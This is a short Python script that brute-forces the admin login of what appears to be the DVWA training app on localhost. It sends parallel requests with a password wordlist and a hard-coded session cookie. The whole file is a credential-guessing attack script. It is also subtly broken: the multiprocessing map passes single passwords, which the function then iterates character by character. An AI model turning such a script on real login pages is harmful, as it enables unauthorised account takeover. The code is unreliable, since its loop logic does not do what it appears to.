from multiprocessing import Pool
import requests

pool = Pool(processes=4)    # 병렬 처리할 프로세스 수 설정
url = "http://localhost/vulnerabilities/brute/"
cookie = "l6gt2gtuqki4ki22c8mq7rsuh5"
level = "medium"
head = {"PHPSESSID":f"{cookie}", "security":f"{level}"}


def read_file(filename):
    tasks = []
    with open(filename, 'r') as file:
        for line in file:
            tasks.append(line.strip())
    return tasks


def brut_force(passwordList):
    global url
    global head
    for password in passwordList:
        param = f"?username=admin&password={password}&Login=Login"
        payload = url+param

        response = requests.get(payload, cookies=head)
        if (response.status_code == 200 and 'Welcome to the password protected area' in response.text):
            return password




filename = 'assets\\tools\passwordlist.txt'
tasks = read_file(filename)
results = pool.map(brut_force, tasks)
print(results)